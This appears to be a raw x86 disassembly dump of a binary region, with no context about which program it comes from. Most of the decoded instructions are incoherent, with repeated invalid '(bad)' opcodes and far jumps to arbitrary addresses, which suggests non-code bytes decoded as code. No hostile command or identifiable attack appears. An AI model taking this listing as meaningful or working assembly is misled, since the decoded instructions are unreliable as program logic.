  40978a:	mov    WORD PTR [edx-0x25],gs
  40978d:	adc    eax,DWORD PTR [ecx]
  40978f:	pop    ecx
  409790:	hlt    
  409791:	mov    ebx,0xae21007d
  409796:	cmp    DWORD PTR [eax+0x2c],esi
  409799:	mov    ds:0x38cf0000,eax
  40979e:	int    0xd1
  4097a0:	icebp  
  4097a1:	fld    QWORD PTR [eax]
  4097a3:	add    ah,cl
  4097a5:	pop    ss
  4097a6:	(bad)  
  4097a8:	adc    al,BYTE PTR [edi]
  4097aa:	(bad)  
  4097ab:	dec    DWORD PTR [esi+eax*8+0x19]
  4097af:	sbb    BYTE PTR [edx-0x61],dh
  4097b2:	or     DWORD PTR [edx],eax
  4097b4:	fild   DWORD PTR ss:[eax]
  4097b7:	add    BYTE PTR [eax],al
  4097b9:	and    eax,0x716271a8
  4097be:	mov    eax,DWORD PTR [esi+0x7d]
  4097c1:	pop    esi
  4097c2:	mov    al,ds:0x92ba4a75
  4097c7:	inc    ebx
  4097c8:	push   ebp
  4097c9:	sti    
  4097ca:	fiadd  DWORD PTR [eax]
  4097cc:	add    BYTE PTR [ebx],bh
  4097ce:	or     al,0xdd
  4097d0:	shl    BYTE PTR [ebx-0x41d0ac9],0xda
  4097d7:	add    BYTE PTR [eax],al
  4097d9:	push   edx
  4097da:	mul    DWORD PTR [edx+ebp*1]
  4097dd:	mov    ecx,0xa30011ca
  4097e2:	mov    ch,0x63
  4097e4:	imul   esp,DWORD PTR [edx+0xa005a86],0xdc555c8d
  4097ee:	mov    bh,0x71
  4097f0:	arpl   bx,cx
  4097f2:	fiadd  DWORD PTR [eax]
  4097f4:	add    BYTE PTR [edi+0x7ee0f921],ch
  4097fa:	push   cs
  4097fb:	jmp    0x71c0:0xe6154ac2
  409802:	cmp    eax,0x1ba1cecc
  409807:	ffreep st(3)
  409809:	rcr    dl,cl
  40980b:	add    BYTE PTR [eax],al
  40980d:	(bad)  
  40980e:	lock inc ebx
  409810:	dec    ebp
  409811:	and    al,BYTE PTR [ecx-0x75f8ac9f]
  409817:	jp     0x409881
  409819:	(bad)
  40981e:	mov    bh,0xe0
  409820:	fs push edx
  409822:	mov    esi,0x6269779b
  409827:	lsl    ebp,WORD PTR cs:[eax+0x7]
  40982c:	xor    DWORD PTR [ebx],ecx
  40982e:	je     0x409835
  409830:	xor    DWORD PTR ds:[ebx+0x6a242535],eax
  409837:	adc    DWORD PTR [ebx],esp
  409839:	add    BYTE PTR [edx+0x3],ah
  40983c:	adc    DWORD PTR [esp+ebx*4],ecx
  40983f:	cmp    esp,DWORD PTR gs:[edx]
  409842:	push   ebp
  409843:	pop    ds
  409844:	add    al,BYTE PTR [eax]
  409846:	bound  esi,QWORD PTR [edi+0x5a]
  409849:	pop    esp
  40984a:	test   al,0x1a
  40984c:	push   edx
  40984d:	inc    edx
  40984e:	pop    ebx
  40984f:	ins    BYTE PTR es:[edi],dx
  409850:	push   edi
  409851:	push   esi
  409852:	bound  esp,QWORD PTR [edi]
  409854:	xor    dh,BYTE PTR [ecx+esi*1]
  409857:	enter  0x2e29,0x73
  40985b:	sub    al,0x3f
  40985d:	bound  eax,QWORD PTR ds:[eax-0x58ea5149]
  409864:	mov    bl,0xb9
  409866:	clc    
  409867:	mov    eax,ds:0x8003bbbd
  40986c:	popf   
  40986d:	mov    ch,0xfa
  40986f:	pushf  
  409870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409871:	lods   eax,DWORD PTR ds:[esi]
  409872:	bound  eax,QWORD PTR [esi]
  409874:	xor    eax,0x28017730
  409879:	cs jg  0x409880
  40987c:	sub    al,0x3d
  40987e:	pop    edx
  40987f:	pop    ds
  409880:	cmp    bh,BYTE PTR [eax+eax*1]
  409883:	push   0x30
  409885:	add    al,BYTE PTR [eax]
  409887:	(bad)  
  409888:	fldcw  WORD PTR [eax-0x40]
  40988b:	les    esp,FWORD PTR [edx+0x7e]
  40988e:	lods   eax,DWORD PTR ds:[esi]
  40988f:	ret    0x7b72
  409892:	test   eax,0xb7886db3
  409897:	mov    al,0x47
  409899:	call   0x6f19faa1
  40989e:	mov    dl,0x12
  4098a0:	outs   dx,BYTE PTR ds:[esi]
  4098a1:	pop    eax
  4098a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a3:	add    al,0x7e
  4098a5:	dec    ebp
  4098a6:	stos   DWORD PTR es:[edi],eax
  4098a7:	or     DWORD PTR [ebx+0x56],esp
  4098aa:	mov    ebp,0x974f5706
  4098af:	cmp    eax,0x43e5b425
  4098b4:	cmp    eax,0x2d29f8ab
  4098b9:	mov    dh,0xfc
  4098bb:	xor    al,0x30
  4098bd:	jge    0x4098a9
  4098bf:	(bad)  
  4098c1:	je     0x409895
  4098c3:	adc    eax,0x9e58fb25
  4098c8:	test   DWORD PTR [ebx-0x3b6d54ac],esi
  4098ce:	inc    esp
  4098cf:	fwait
  4098d0:	sahf   
  4098d1:	mov    edx,0x9e829774
  4098d6:	add    esp,DWORD PTR [edx-0x27]
  4098d9:	ror    DWORD PTR [ecx-0x6f],cl
  4098dc:	cwde   
  4098dd:	call   0x244c:0xb68b244d
  4098e4:	(bad)  
  4098e5:	mov    esi,0x94250044
  4098ea:	out    0x3,eax
  4098ec:	(bad)  
  4098ed:	fst    DWORD PTR [edi]
  4098ef:	(bad)  
  4098f0:	lods   al,BYTE PTR ds:[esi]
  4098f1:	add    al,0x27
  4098f3:	rcr    BYTE PTR [ebx-0x6c26f4f1],cl
  4098f9:	or     edi,ebx
  4098fb:	loopne 0x409885
  4098fd:	or     BYTE PTR [esp+edx*8],cl
  409900:	mov    ebx,ecx
  409902:	add    ah,dh
  409904:	mov    eax,0xad2bd31a
  409909:	or     eax,esi
  40990b:	xlat   BYTE PTR ds:[ebx]
  40990c:	test   eax,0x91dfda03
  409911:	push   cs
  409912:	(bad)  
  409914:	sub    BYTE PTR [ecx],0x1
  409917:	xor    eax,0x5279aff0
  40991c:	in     al,dx
  40991d:	mov    ds:0xa7c7256e,al
  409922:	fs inc ecx
  409924:	mov    edx,0xb33d66a7
  409929:	mov    ds:0xafba096d,al
  40992e:	push   0xd9c710
  409933:	(bad)  
  409934:	arpl   dx,bx
  409936:	add    al,0xcb
  409938:	fs int 0x2
  40993b:	out    dx,eax
  40993c:	ins    BYTE PTR es:[edi],dx
  40993d:	enter  0xd51a,0x58
  409941:	fld    DWORD PTR [eax]
  409943:	stos   DWORD PTR es:[edi],eax
  409944:	adc    al,0x20
  409946:	clc    
  409947:	mov    cs,WORD PTR [ebx]
  409949:	xor    esi,edi
  40994b:	bound  eax,QWORD PTR [eax]
  40994d:	sbb    esi,DWORD PTR [esi]
  40994f:	out    0x50,al
  409951:	adc    DWORD PTR [esi+edi*8],esp
  409954:	pop    ds
  409955:	dec    esi
  409956:	rcl    BYTE PTR [edi],cl
  409958:	loopne 0x4099af
  40995a:	lds    ecx,FWORD PTR [edi+ecx*1]
  40995d:	popa   
  40995e:	leave  
  40995f:	push   es
  409960:	repz and bl,dl
  409963:	add    al,0xef
  409965:	pop    esi
  409966:	fsubr  DWORD PTR [ebx]
  409968:	jmp    0x754172ce
  40996d:	sti    
  40996e:	data16 mov ds:0xb77e0f5a,al
  409974:	jne    0x40996c
  409976:	jno    0x409935
  409978:	pop    ecx
  409979:	in     al,0x5e
  40997b:	mov    edi,0xb95f1f00
  409980:	or     DWORD PTR [ebx+0x7e0000d7],0xc92232ee
  40998a:	repnz and eax,0x3af55c37
  409990:	add    BYTE PTR [ebx-0x1c],al
  409993:	and    DWORD PTR [ecx+edx*2],esp
  409996:	rol    DWORD PTR [eax],0x0
  409999:	push   esp
  40999a:	iret   
  40999b:	pop    es
  40999c:	or     al,0x61
  40999e:	ret    
  40999f:	sbb    ebp,DWORD PTR [edx]
  4099a1:	cmp    esi,ebx
  4099a3:	add    BYTE PTR [ecx],dl
  4099a5:	dec    ebx
  4099a6:	fnsave [edi]
  4099a8:	adc    eax,0x1e08d12d
  4099ad:	arpl   ax,si
  4099af:	add    BYTE PTR [eax],al
  4099b1:	add    BYTE PTR [edx-0x707570b7],bl
  4099b7:	inc    ebp
  4099b8:	fwait
  4099b9:	lods   al,BYTE PTR ds:[esi]
  4099ba:	mov    bh,0x56
  4099bc:	test   BYTE PTR [edi-0x6c40a24b],dl
  4099c2:	xchg   ebx,eax
  4099c3:	dec    ecx
  4099c4:	mov    WORD PTR [eax-0x19f53],ds
  4099ca:	cli    
  4099cb:	clc    
  4099cc:	xor    BYTE PTR [eax],dl
  4099ce:	imul   esi,esp,0x1
  4099d1:	and    BYTE PTR [esi-0x4],ch
  4099d4:	daa    
  4099d5:	or     BYTE PTR [edi-0x1c],ah
  4099d8:	cmp    dh,BYTE PTR [eax]
  4099da:	cld    
  4099db:	fbstp  TBYTE PTR [edx]
  4099dd:	cmp    dh,dh
  4099df:	(bad)  
  4099e0:	add    BYTE PTR [eax],al
  4099e2:	and    esi,DWORD PTR [eax+edi*8-0x53]
  4099e6:	js     0x409a37
  4099e8:	mov    esp,0xb07b4bbc
  4099ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ee:	jo     0x409a1d
  4099f0:	hlt    
  4099f1:	mov    eax,ds:0xabba3e84
  4099f6:	bound  eax,QWORD PTR [edi-0x71f95e14]
  4099fc:	mov    cl,0xb2
  4099fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ff:	shl    ebp,1
  409a01:	scas   eax,DWORD PTR es:[edi]
  409a02:	stos   BYTE PTR es:[edi],al
  409a03:	clc    
  409a04:	mov    ebp,DWORD PTR [esi-0x254f692d]
  409a0a:	in     al,dx
  409a0b:	mov    WORD PTR [ebp+edx*4-0x2a07c86a],es
  409a12:	jecxz  0x409a44
  409a14:	add    al,BYTE PTR [eax]
  409a16:	add    BYTE PTR [edx+0x3d],ah
  409a19:	popa   
  409a1a:	push   0xb778af6
  409a1f:	bound  eax,QWORD PTR [edi-0x29]
  409a22:	int3   
  409a23:	sub    esp,DWORD PTR [edi-0x37]
  409a26:	iret   
  409a27:	sub    cl,BYTE PTR [edi+0x2]
  409a2a:	add    BYTE PTR [edx-0x3f],ah
  409a2d:	pop    edx
  409a2e:	xor    DWORD PTR [esi+esi*1+0x5713c35],eax
  409a35:	push   eax
  409a36:	add    BYTE PTR [edx-0x77],ah
  409a39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a3b:	add    BYTE PTR [ebp-0x69],ch
  409a3e:	and    eax,0xec949e80
  409a44:	mov    ebx,DWORD PTR [ebp+ebx*4-0x73734818]
  409a4b:	sub    bh,BYTE PTR [ebp-0x6d]
  409a4e:	xchg   ebx,eax
  409a4f:	loope  0x409aa7
  409a51:	test   BYTE PTR [ecx-0x332d581b],cl
  409a57:	sub    DWORD PTR [esi-0x10],ecx
  409a5a:	(bad)  
  409a5b:	lock pop esp
  409a5d:	mov    bh,0xa3
  409a5f:	mov    edi,0x1ca8b549
  409a64:	nop
  409a65:	sti    
  409a66:	stc    
  409a67:	pop    es
  409a68:	pop    edi
  409a6a:	dec    ebp
  409a6c:	mov    ecx,DWORD PTR [edi-0x7e27166c]
  409a72:	(bad)  
  409a73:	mov    ebp,0x2146a721
  409a78:	jle    0x409a23
  409a7a:	pop    esi
  409a7b:	add    BYTE PTR [edx],ah
  409a7d:	sbb    BYTE PTR [esi-0x182ef4ba],0x3
  409a84:	(bad)  
  409a85:	fst    DWORD PTR [esi-0x6b]
  409a88:	repz push esi
  409a8a:	push   ebp
  409a8b:	add    BYTE PTR [ebp-0x4e730edb],0x4d
  409a92:	xchg   edx,eax
  409a93:	mov    esp,0xe1de65ca
  409a98:	or     BYTE PTR [eax+ebp*8+0x3],0x62
  409a9d:	fld    st(1)
  409a9f:	mov    ecx,0xebcc356c
  409aa4:	sbb    ebp,DWORD PTR [edx+ecx*8]
  409aa7:	mov    cl,0xde
  409aa9:	cmp    bh,BYTE PTR [eax-0x17]
  409aac:	dec    ebp
  409aad:	and    esi,esp
  409aaf:	adc    BYTE PTR [eax-0x27],dh
  409ab2:	pop    esp
  409ab3:	mov    ds:0x3e87d02,al
  409ab8:	(bad)  
  409ab9:	fnstcw WORD PTR [ecx]
  409abb:	dec    eax
  409abc:	xchg   edx,eax
  409abd:	retf   
  409abe:	out    0x3,eax
  409ac0:	(bad)  
  409ac1:	fldcw  WORD PTR [edi]
  409ac3:	push   edx
  409ac4:	test   al,0xd1
  409ac6:	cs add al,0x62
  409ac9:	fldcw  WORD PTR [edi+ecx*8-0x376eece6]
  409ad0:	push   ss
  409ad1:	or     BYTE PTR [edi+0x4],al
  409ad4:	(bad)  
  409ad5:	fincstp 
  409ad7:	cmp    al,0x38
  409ad9:	in     al,dx
  409ada:	push   ss
  409adb:	xor    esi,DWORD PTR [ebx-0x2b]
  409ade:	or     eax,0xd92c0036
  409ae3:	(bad)  
  409ae4:	popa   
  409ae5:	push   ecx
  409ae6:	stos   DWORD PTR es:[edi],eax
  409ae7:	(bad)  
  409ae8:	arpl   WORD PTR [ebx-0x27],ax
  409aeb:	add    BYTE PTR [ebx],bl
  409aed:	mov    eax,ds:0x61e9db01
  409af2:	fld    DWORD PTR [eax]
  409af4:	call   0x15417455
  409af9:	mov    dh,0x30
  409afb:	in     eax,dx
  409afc:	jmp    0x5e417462
  409b01:	in     al,0x7c
  409b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b04:	inc    BYTE PTR [ebp-0xdcd43ce]
  409b0a:	je     0x409b05
  409b0c:	or     al,0x87
  409b0e:	ins    BYTE PTR es:[edi],dx
  409b0f:	int    0x1a
  409b11:	mov    edi,DWORD PTR [eax-0x2f]
  409b14:	jmp    0x2b41747a
  409b19:	sbb    DWORD PTR [ebp+0x57],edi
  409b1c:	xor    al,0x53
  409b1e:	fadd   QWORD PTR [edx]
  409b20:	cmp    BYTE PTR [eax],ah
  409b22:	pushf  
  409b23:	push   esp
  409b24:	sbb    eax,0x314f93a4
  409b29:	pushf  
  409b2a:	test   BYTE PTR [esi+0x25],dl
  409b2d:	cdq    
  409b2e:	retf   
  409b2f:	adc    eax,0x4396cfcc
  409b34:	inc    edi
  409b35:	xchg   esp,eax
  409b36:	cmp    DWORD PTR [edi],0xa
  409b39:	(bad)  
  409b3a:	mov    dl,0x7b
  409b3c:	push   cs
  409b3d:	(bad)  
  409b3e:	mov    ebx,0xb7bf1122
  409b43:	cs push ss
  409b45:	add    BYTE PTR [edi+0x420b60b9],cl
  409b4b:	jmp    0x409bc8
  409b4d:	clc    
  409b4e:	xchg   edi,eax
  409b4f:	sahf   
  409b50:	je     0x409b3f
  409b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b54:	sub    al,0x25
  409b56:	data16 fld DWORD PTR [eax]
  409b59:	mov    ecx,0xb558af8f
  409b5e:	popa   
  409b5f:	fld    DWORD PTR [eax]
  409b61:	mov    bh,0x94
  409b63:	xchg   ecx,eax
  409b64:	dec    ebx
  409b65:	add    BYTE PTR [edx],dl
  409b67:	aad    0x15
  409b69:	push   ss
  409b6a:	mov    bh,0xc3
  409b6c:	dec    edi
  409b6d:	push   edi
  409b6e:	jmp    0x13c1:0xe65353b7
  409b75:	sbb    esp,DWORD PTR [eax-0x27]
  409b78:	dec    ebx
  409b79:	dec    ebx
  409b7a:	dec    cl
  409b7c:	sbb    edx,DWORD PTR [ebx]
  409b7e:	test   al,0xd0
  409b80:	aas    
  409b81:	push   edx
  409b82:	and    eax,0xe44f1fe9
  409b87:	test   eax,0x7f186d75
  409b8c:	jns    0x409c00
  409b8e:	push   ss
  409b8f:	mov    eax,ds:0x3461003a
  409b94:	ror    esi,cl
  409b96:	iret   
  409b97:	aam    0x0
  409b99:	add    BYTE PTR [ebx],al
  409b9b:	lahf   
  409b9c:	inc    esi
  409b9d:	jo     0x409bae
  409b9f:	aad    0x0
  409ba1:	add    ch,dh
  409ba3:	adc    eax,DWORD PTR [edx-0x6360e863]
  409ba9:	int3   
  409baa:	add    cl,bh
  409bac:	sbb    ebx,ecx
  409bae:	lea    esi,[ebx+0x21fffe56]
  409bb4:	and    al,0xf5
  409bb6:	mov    ah,0xee
  409bb8:	xor    cl,bh
  409bba:	lock xchg esp,eax
  409bbc:	aad    0x0
  409bbe:	add    ah,al
  409bc0:	dec    edi
  409bc1:	adc    BYTE PTR [esi-0x2024e],0xa5
  409bc8:	je     0x409b74
  409bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bcb:	mov    eax,ds:0x6a0000d5
  409bd0:	lea    eax,[esi+0x0]
  409bd3:	ficom  WORD PTR [eax]
  409bd5:	iret   
  409bd6:	ret    
  409bd7:	dec    esp
  409bd8:	or     al,0xf6
  409bda:	and    cl,0x44
  409bdd:	out    dx,al
  409bde:	mov    WORD PTR [edx-0x5a],fs
  409be1:	(bad)  
  409be2:	repz fidiv DWORD PTR [edx-0x289d1875]
  409be9:	cmp    BYTE PTR [esi],ch
  409beb:	cmp    DWORD PTR [ebx+0xb],eax
  409bee:	sbb    ebx,DWORD PTR [esi+0x2c]
  409bf1:	push   ebx
  409bf2:	cmp    bh,BYTE PTR [ebp-0x30]
  409bf5:	sbb    eax,0x5a6e2459
  409bfa:	addr16 inc ebx
  409bfc:	adc    al,0x4
  409bfe:	sbb    eax,0x6436a49
  409c03:	pop    esp
  409c04:	xor    bh,dh
  409c06:	adc    ch,BYTE PTR [ecx+0x4]
  409c09:	dec    esi
  409c0a:	push   eax
  409c0b:	jp     0x409c70
  409c0d:	xor    eax,0x63480030
  409c12:	pop    ds
  409c13:	cmp    eax,DWORD PTR [esi+0x6a]
  409c16:	imul   esi,DWORD PTR [esi+0x3e],0xfc3a28c5
  409c1d:	int3   
  409c1e:	and    DWORD PTR [edi],esp
  409c20:	sub    ecx,ebp
  409c22:	dec    eax
  409c23:	dec    eax
  409c24:	adc    al,0xbe
  409c26:	add    al,0x0
  409c28:	(bad)  
  409c29:	lds    esi,FWORD PTR [ebx+esi*1]
  409c2c:	mov    WORD PTR [ebx+0x26c56c67],ds
  409c32:	add    BYTE PTR gs:[edx+0x44],ah
  409c36:	(bad)  
  409c37:	rol    DWORD PTR [ecx],1
  409c39:	xchg   ecx,eax
  409c3a:	icebp  
  409c3b:	push   DWORD PTR ds:0x358592b1
  409c41:	cmp    eax,0xcd25ff9e
  409c46:	or     DWORD PTR [ebp-0x5f],esi
  409c49:	lock dec eax
  409c4b:	push   cs
  409c4c:	mov    DWORD PTR ds:0x84620002,ebx
  409c52:	jmp    0x2707de5
  409c57:	add    BYTE PTR [edx-0x27],ah
  409c5a:	leave  
  409c5b:	xor    al,0x7a
  409c5d:	mov    eax,0xea867917
  409c62:	out    0x3,eax
  409c64:	(bad)  
  409c65:	fnstenv [edi]
  409c67:	hlt    
  409c68:	(bad)  
  409c69:	and    eax,0x16dbef3d
  409c6e:	sbb    esi,esi
  409c70:	(bad)  
  409c71:	sub    DWORD PTR [edi],edi
  409c73:	clc    
  409c74:	add    BYTE PTR [eax-0x1f6ea728],bh
  409c7a:	inc    ebx
  409c7b:	ss mov edx,ss
  409c7e:	fcom   DWORD PTR [ecx]
  409c80:	jmp    0x2eaa:0xf41f1db4
  409c87:	dec    esp
  409c88:	std    
  409c89:	lahf   
  409c8a:	and    al,ch
  409c8c:	add    esp,DWORD PTR [edx-0x27]
  409c8f:	jmp    0x523d:0xb5e74c23
  409c96:	test   al,0xbd
  409c98:	add    esp,DWORD PTR [edx-0x27]
  409c9b:	push   ss
  409c9c:	adc    BYTE PTR [ecx+ebx*8],ch
  409c9f:	in     eax,dx
  409ca0:	add    DWORD PTR [esi-0x2f],edx
  409ca3:	out    dx,eax
  409ca4:	or     DWORD PTR [edx-0x27],esp
  409ca7:	mov    ah,0xe1
  409ca9:	push   eax
  409caa:	sub    al,0xe8
  409cac:	add    esp,DWORD PTR [edx-0x27]
  409caf:	out    0x3,eax
  409cb1:	(bad)  
  409cb2:	frndint 
  409cb4:	xor    DWORD PTR [ebp-0x16],edi
  409cb7:	shl    BYTE PTR [eax],cl
  409cb9:	jbe    0x409cb2
  409cbb:	aad    0x64
  409cbd:	retf   0xd0f6
  409cc0:	cmp    al,0x6b
  409cc2:	stc    
  409cc3:	leave  
  409cc4:	cmp    DWORD PTR [esi+0x5f39d2e9],esp
  409cca:	fcmovnb st,st(4)
  409ccc:	outs   dx,BYTE PTR ds:[esi]
  409ccd:	pop    ebx
  409cce:	in     eax,0xba
  409cd0:	sub    eax,0xcb00df55
  409cd5:	add    eax,0xdb02d3
  409cda:	rcl    BYTE PTR gs:[ebx],cl
  409cdd:	mov    bl,0xa2
  409cdf:	(bad)  
  409ce0:	pop    ecx
  409ce1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ce2:	lahf   
  409ce3:	mov    eax,0xc463ec63
  409ce8:	inc    DWORD PTR [ecx]
  409cea:	arpl   bp,dx
  409cec:	adc    ah,bh
  409cee:	or     DWORD PTR cs:[ecx],0x1ed15def
  409cf5:	retf   0xed49
  409cf8:	pusha  
  409cf9:	rol    DWORD PTR [ecx-0x4c],0x73
  409cfd:	scas   al,BYTE PTR es:[edi]
  409cfe:	adc    al,0x82
  409d00:	popa   
  409d01:	mov    al,ds:0x8e60af2e
  409d06:	sub    al,0xdd
  409d08:	jo     0x409c9c
  409d0a:	sbb    ebx,DWORD PTR [esi-0x1ef47b82]
  409d10:	xor    eax,0x719c08bd
  409d15:	call   0x8844:0xc018d045
  409d1c:	push   esp
  409d1d:	xor    al,0x19
  409d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d20:	pop    ecx
  409d21:	aas    
  409d22:	push   ds
  409d23:	xchg   ecx,eax
  409d24:	add    eax,0x508423fb
  409d29:	sub    BYTE PTR [ebp+0x6528417c],bl
  409d2f:	mov    ds,WORD PTR [edx+0x2f]
  409d32:	mov    cl,0xba
  409d34:	inc    edi
  409d35:	and    ch,0x64
  409d38:	stos   DWORD PTR es:[edi],eax
  409d39:	add    DWORD PTR [ebx],0x41
  409d3c:	stos   DWORD PTR es:[edi],eax
  409d3d:	dec    eax
  409d3e:	add    dh,ch
  409d40:	push   0xffffffae
  409d42:	pop    DWORD PTR [esi+0x2e]
  409d45:	test   al,0x58
  409d47:	jmp    0xdbff:0x78cb778
  409d4e:	add    BYTE PTR [esi+0x78a9bf72],ch
  409d54:	jno    0x409d00
  409d56:	mov    edx,0x90be0d75
  409d5b:	mov    bl,BYTE PTR [esi+0x418a9592]
  409d61:	xchg   ebx,eax
  409d62:	(bad)
  409d65:	call   0x4896:0x9a9adc81
  409d6c:	inc    esp
  409d6d:	xchg   esi,eax
  409d6e:	nop
  409d6f:	in     al,0x4b
  409d71:	xchg   ebx,eax
  409d72:	add    DWORD PTR [edx+0x3d],0xffffffce
  409d76:	mov    WORD PTR [ebx],fs
  409d78:	ss cmc 
  409d7a:	fsub   QWORD PTR [eax]
  409d7c:	das    
  409d7d:	in     eax,0xe2
  409d7f:	adc    DWORD PTR [ecx-0x58],edi
  409d82:	in     eax,dx
  409d83:	pop    esi
  409d84:	xor    eax,0x7212eafd
  409d89:	lahf   
  409d8a:	cdq    
  409d8b:	push   0xfffffffe
  409d8d:	repnz in eax,0x44
  409d90:	sub    eax,0x6961fee6
  409d95:	mov    edx,0xd71a36ec
  409d9a:	rcr    DWORD PTR [esi+0x5],1
  409d9d:	fisttp WORD PTR [ecx-0x3a29f364]
  409da3:	add    BYTE PTR [eax-0x513224fe],cl
  409da9:	cld    
  409daa:	ret    
  409dab:	in     al,dx
  409dac:	push   cs
  409dad:	add    ebp,eax
  409daf:	rol    BYTE PTR [eax],cl
  409db1:	adc    al,dh
  409db3:	fisubr WORD PTR [ebp+0x5ad99c46]
  409db9:	repnz das 
  409dbb:	es jle 0x409d61
  409dbe:	dec    ecx
  409dbf:	dec    ebp
  409dc0:	ds loope 0x409df0
  409dc3:	cmp    DWORD PTR [eax],ebp
  409dc5:	in     al,0x3c
  409dc7:	sub    ah,BYTE PTR [edx-0x6]
  409dca:	jp     0x409e3c
  409dcc:	inc    edx
  409dcd:	add    DWORD PTR [ebx+eiz*1],ebp
  409dd0:	aas    
  409dd1:	popa   
  409dd2:	daa    
  409dd3:	and    edx,DWORD PTR [edi+0x532c3607]
  409dd9:	arpl   WORD PTR [eax],dx
  409ddb:	pop    ss
  409ddc:	arpl   WORD PTR [ecx],di
  409dde:	push   es
  409ddf:	adc    bh,BYTE PTR [edx]
  409de1:	xor    ebp,edi
  409de3:	sbb    BYTE PTR [ebx+ebp*1+0x1a],bl
  409de7:	sbb    al,0x58
  409de9:	bound  eax,QWORD PTR [eax]
  409deb:	sbb    bh,BYTE PTR [esi+0x2f]
  409dee:	sub    BYTE PTR [ecx],bl
  409df0:	jnp    0x409e29
  409df2:	push   ss
  409df3:	pop    eax
  409df4:	xor    eax,0x711f193c
  409df9:	pop    edi
  409dfa:	pop    esi
  409dfb:	sub    edi,DWORD PTR [edx+0x39]
  409dfe:	add    eax,0xa9826200
  409e03:	mov    ebx,0xaea6b0f8
  409e08:	add    bl,ch
  409e0a:	jge    0x409e06
  409e0c:	repnz rcl BYTE PTR [ebp-0x7d425e47],1
  409e13:	mov    esp,0xa397c9e6
  409e18:	mov    esi,0xeeb2daca
  409e1d:	retf   0xa798
  409e20:	lahf   
  409e21:	scas   al,BYTE PTR es:[edi]
  409e22:	push   esi
  409e23:	xchg   edi,eax
  409e24:	fwait
  409e25:	mov    BYTE PTR [edi-0x2c],bl
  409e28:	fimul  WORD PTR [ebx+0x29d7d1b0]
  409e2e:	push   es
  409e2f:	idiv   BYTE PTR [edi-0x23]
  409e32:	mov    eax,ds:0x7ceab599
  409e37:	mov    BYTE PTR [edx-0x6d7d8ee2],cl
  409e3d:	in     eax,dx
  409e3e:	jg     0x409dce
  409e40:	jg     0x409e0e
  409e42:	fcomp  DWORD PTR [edx+ebp*8+0x3e]
  409e46:	and    BYTE PTR [ebp+0x552d3de9],cl
  409e4c:	loope  0x409e5b
  409e4e:	and    bl,BYTE PTR [edx+0x4264daaf]
  409e54:	mov    al,ds:0x36553d3
  409e59:	(bad)  
  409e5a:	fprem  
  409e5c:	inc    edi
  409e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e5e:	test   BYTE PTR [eax],bl
  409e60:	mov    WORD PTR ds:[ecx-0x705ca223],ds
  409e67:	mov    ebx,0xbb978543
  409e6c:	cmp    al,0x0
  409e6e:	dec    esi
  409e6f:	mov    eax,ds:0x923340af
  409e74:	fwait
  409e75:	push   ebp
  409e76:	push   ds
  409e77:	rol    dl,0x3c
  409e7a:	push   ss
  409e7b:	mov    ah,al
  409e7d:	jb     0x409ec6
  409e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e80:	xchg   ecx,eax
  409e81:	dec    ecx
  409e82:	aas    
  409e83:	lods   eax,DWORD PTR ds:[esi]
  409e84:	mov    eax,DWORD PTR [ebx]
  409e86:	(bad)  
  409e87:	f2xm1  
  409e89:	and    al,0x6b
  409e8b:	out    dx,al
  409e8c:	shl    DWORD PTR [esi+ebp*2-0x23],0xd4
  409e91:	sub    eax,0x598ed962
  409e96:	xor    dl,BYTE PTR [esi-0x7cddac5a]
  409e9c:	xchg   DWORD PTR [ebx+0x15],esi
  409e9f:	jge    0x409e42
  409ea1:	dec    ebp
  409ea2:	sub    eax,DWORD PTR [ebp-0x5517aad7]
  409ea8:	sub    eax,0x29881d59
  409ead:	cmp    al,0xb8
  409eaf:	call   0xa0f8f3f0
  409eb4:	inc    edx
  409eb5:	imul   edx,ecx,0x7e
  409eb8:	sub    eax,DWORD PTR [ebp-0x38]
  409ebb:	xchg   ebx,eax
  409ebc:	add    BYTE PTR [esi-0x45],al
  409ebf:	nop
  409ec0:	outs   dx,DWORD PTR ds:[esi]
  409ec1:	cs xchg ecx,eax
  409ec3:	mov    WORD PTR [ebp+0x19],?
  409ec6:	(bad)  
  409ec7:	lea    eax,[eax]
  409ec9:	stos   DWORD PTR es:[edi],eax
  409eca:	push   es
  409ecb:	std    
  409ecc:	out    0x86,al
  409ece:	or     esi,edi
  409ed0:	add    BYTE PTR [ebp-0xef4f000],dh
  409ed6:	adc    BYTE PTR [edi],0xc
  409ed9:	ror    DWORD PTR [eax+0x5e],0xd9
  409edd:	add    BYTE PTR [ecx-0x761af00d],ch
  409ee3:	stc    
  409ee4:	(bad)  
  409ee5:	out    dx,eax
  409ee6:	or     DWORD PTR cs:[ecx],ecx
  409ee9:	cli    
  409eea:	dec    esp
  409eeb:	out    dx,eax
  409eec:	push   es
  409eed:	repnz dec esp
  409eef:	fdiv   DWORD PTR ds:0x38cc40c8
  409ef5:	test   DWORD PTR [ecx+eax*8+0x15],0x15c833a9
  409efd:	loope  0x409f14
  409eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f00:	sub    al,0xc3
  409f02:	inc    edx
  409f03:	enter  0xdc1f,0x34
  409f07:	popf   
  409f08:	xor    al,al
  409f0a:	jmp    0xff417870
  409f0f:	dec    ecx
  409f10:	retf   
  409f11:	xor    eax,0x3bd56cce
  409f16:	mov    edi,0xe92bd34a
  409f1b:	popa   
  409f1c:	fld    DWORD PTR [eax]
  409f1e:	and    edi,DWORD PTR [ecx+0x15]
  409f21:	out    dx,eax
  409f22:	add    esi,DWORD PTR [ebx+0x5]
  409f25:	cli    
  409f26:	mov    ah,0x92
  409f28:	adc    dh,al
  409f2a:	(bad)  
  409f2b:	je     0x409f29
  409f2d:	test   esi,0xc5dc2f4d
